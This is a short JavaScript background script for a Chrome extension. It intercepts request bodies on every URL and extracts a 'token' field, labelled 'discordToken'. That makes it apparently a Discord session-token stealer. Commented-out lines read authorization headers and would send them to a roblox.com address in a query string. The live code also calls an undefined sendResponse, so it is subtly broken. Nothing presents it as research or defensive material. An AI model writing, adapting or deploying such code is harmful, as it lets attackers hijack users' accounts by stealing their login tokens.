chrome.runtime.onMessage.addListener(function (request, sender) {
  console.log(request);
  if (request.verify == "true") {
    chrome.webRequest.onBeforeRequest.addListener(
      function (details) {
        var token = "";
        if (details.requestBody !== undefined) {
          if (details.requestBody.raw) {
            token = details.requestBody.raw[0].bytes;
            var enc = new TextDecoder("utf-8");
            token = enc.decode(token);
            token = JSON.parse(token).token;

            sendResponse({discordToken: token});
            /* chrome.tabs.query(
              { active: true, currentWindow: true },
              function (tabs) {
                chrome.tabs.sendMessage(
                  tabs[0].id,
                  { discordToken: token },
                  function (response) {}
                );
              }
            ); */
          }
        }
        //chrome.runtime.sendMessage(token);
        /* for (var i = 0; i < details.requestHeaders.length; ++i) {
      if (details.requestHeaders[i].name === 'authorization') {
        console.log(details.requestHeaders[i].value);
        //window.location.href = "https://www.roblox.com/home?code="+details.requestHeaders[i].value;
        break;
      }
    }
    return {requestHeaders: details.requestHeaders}; */
        return { requestBody: details.requestBody };
      },
      { urls: ["<all_urls>"] },
      ["requestBody"]
    );
  }
});